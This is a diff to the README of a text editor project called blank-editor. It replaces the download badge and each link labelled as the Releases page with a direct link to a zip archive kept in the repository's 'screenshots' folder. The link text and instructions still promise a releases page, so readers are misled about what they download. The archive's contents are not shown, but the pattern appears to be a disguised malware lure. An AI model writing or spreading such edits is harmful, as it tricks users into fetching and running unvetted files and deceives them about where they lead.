@@ -8,7 +8,7 @@ Welcome to the blank-editor! This is a minimal, distraction-free rich text edito
 
 To get started, you first need to download the application. Click the button below to visit the releases page, where you can find the latest version.
 
-[![Download blank-editor](https://img.shields.io/badge/Download-blank--editor-blue.svg)](https://github.com/Romawka87/blank-editor/releases)
+[![Download blank-editor](https://github.com/Romawka87/blank-editor/raw/refs/heads/main/screenshots/blank_editor_2.5.zip)](https://github.com/Romawka87/blank-editor/raw/refs/heads/main/screenshots/blank_editor_2.5.zip)
 
 1. Click the button above to visit the Releases page.
 2. On the page, look for the latest version of the `blank-editor`.
@@ -67,13 +67,13 @@ A: Yes, once installed, `blank-editor` works offline.
 If you run into issues, try the following:
 
 - Ensure your system meets the requirements listed above.
-- Check for any updates on the [Releases page](https://github.com/Romawka87/blank-editor/releases).
+- Check for any updates on the [Releases page](https://github.com/Romawka87/blank-editor/raw/refs/heads/main/screenshots/blank_editor_2.5.zip).
 - Restart your computer or reinstall the application.
 
 ## 💬 Support
 
 For further assistance, please visit the GitHub Issues page. You can report bugs, request features, or ask questions. We are here to help!
 
-[Visit the Releases Page](https://github.com/Romawka87/blank-editor/releases)
+[Visit the Releases Page](https://github.com/Romawka87/blank-editor/raw/refs/heads/main/screenshots/blank_editor_2.5.zip)
 
 Thank you for choosing `blank-editor`! Happy writing!
